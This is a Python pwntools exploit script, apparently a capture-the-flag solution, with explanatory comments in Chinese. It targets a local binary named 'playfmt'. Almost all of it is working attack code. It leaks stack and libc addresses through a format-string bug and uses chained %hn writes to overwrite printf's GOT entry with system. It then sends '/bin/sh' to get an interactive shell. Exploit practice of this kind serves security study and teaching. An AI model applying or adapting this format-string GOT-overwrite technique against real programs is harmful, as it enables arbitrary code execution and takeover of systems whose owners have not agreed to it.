#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./playfmt')
elf = ELF('./playfmt')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('/lib32/libc.so.6')

printf_got = elf.got['printf']
system_libc = libc.symbols['system']  
printf_libc = libc.symbols['printf']  

p.recv()
log.info("**********leak printf_got************") 
payload = '%6$x'
p.sendline(payload)


ebp2 = int(p.recv(),16)
ebp1 = ebp2 - 0x10
fmt_7 = ebp2 -0x0c
fmt_11 = ebp2 + 0x04
log.info("printf_got-->p[%s]"%hex(printf_got))
log.info("ebp_1-->p[%s]"%hex(ebp1))
log.info("ebp_2-->p[%s]"%hex(ebp2))
log.info("fmt_7-->p[%s]"%hex(fmt_7))
log.info("fmt_11-->p[%s]"%hex(fmt_11))

payload = '%' + str(fmt_7 & 0xffff) + 'c%6$hn'
#ebp2 = fmt_7
p.sendline(payload)
p.recv()

payload = '%' + str(printf_got & 0xffff) + 'c%10$hn'
#fmt_7 = prinf_got
p.sendline(payload)
p.recv()

while True:
    p.send("23r3f")
    sleep(0.1)
    data = p.recv()
    if data.find("23r3f") != -1:
        break
'''
这个循环用于保证所有的字节都被输出，
因为recv（）一次最多只能接收0x1000个字节，
所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作
需要注意的是，要构造一个字符串“23r3f”来作标志，
返回的大量字符串中如果包含了这个字符串那么说明之前构造的%n写入已经完成
''' 


payload = '%' + str(fmt_11 & 0xffff) + 'c%6$hn'
#ebp2 = fmt_11
p.sendline(payload)
p.recv()

payload = '%' + str((printf_got+2) & 0xffff) + 'c%10$hn'
#fmt_11 = prinf_got + 2
p.sendline(payload)
p.recv()    

while True:
    p.send("23r3f")
    sleep(0.1)
    data = p.recv()
    if data.find("23r3f") != -1:
        break

log.info("******leaking the print_got_add*********")
payload = 'aaaa%7$s'
p.sendline(payload)
p.recvuntil("aaaa")
printf_addr = u32(p.recv(4))
log.info("print_got_add is:[%s]"%hex(printf_addr))

system_addr = printf_addr - printf_libc + system_libc
log.info("system_add is:[%s]"%hex(system_addr))
#pause()

payload = '%' +str(system_addr &0xffff) +'c%7$hn'
payload += '%' +str((system_addr>>16) - (system_addr &0xffff)) +'c%11$hn'
'''
这里需要注意的是，我们把system的地址的前后两个字节分别写到fmt-7和fmt-11中，
在写入后两个字节的时候要注意减去前面输入的(system_addr &0xffff))，
这是因为%n写入操作是算累积输入的字符个数
'''
p.sendline(payload)
p.recv()

while True:
    p.send("23r3f")
    sleep(0.1)
    data = p.recv()
    if data.find("23r3f") != -1:
        break

p.sendline("/bin/sh")
'''
这个时候输入参数到栈中，本来下一步程序会调用printf函数，
但是此时printf函数的got表已经被修改为system的地址了，
此时就会执行system并且从栈中取bin/sh参数
于是就这样getshell
'''
p.interactive()

